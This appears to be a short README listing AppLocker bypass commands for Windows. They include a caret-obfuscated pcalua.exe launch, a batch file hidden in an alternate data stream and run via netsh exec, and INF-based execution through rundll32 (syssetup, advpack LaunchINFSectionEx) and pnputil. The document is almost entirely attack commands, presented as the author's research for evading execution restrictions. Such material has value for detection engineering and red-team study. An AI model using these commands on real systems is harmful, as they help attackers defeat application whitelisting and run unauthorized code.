# AppLocker
specialized Security and protection of users, Of malicious execution in System, the main target of it the restriction Run Execution Attacker, Applocker has some Rules For Restricted Ex-Run, All these contents come to of my research and not to be share by anyone

pcalua.exe:>
-------------------------------------------------------------
```
p^c^a^l^u^a^ ^-^n^ ^-^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n notepad.exe
```

Alternate Data Streams ADS:>
-------------------------------------------------------------
```
cmd.exe:> type C:\Users\Gihad\Desktop\file.bat > C:\Users\Gihad\Desktop\test.txt:x22x2
cmd.exe:> netsh exec C:\Users\Gihad\Desktop\test.txt:x22x2
```

ScriptLet Execution InSide .INF:>
-------------------------------------------------------------
```
rundll32.exe syssetup,SetupInfObjectInstallAction DefaultInstall 128 C:\FilesINFExecution.inf 

rundll32 advpack.dll,LaunchINFSectionEx C:\testExecutionINF.inf,Name Method invoke in Files INF,
```

pnputil.exe Launcher installer .INF:>
-------------------------------------------------------------
```
pnputil.exe /add-driver C:\FilesINFExecution.inf /install

```
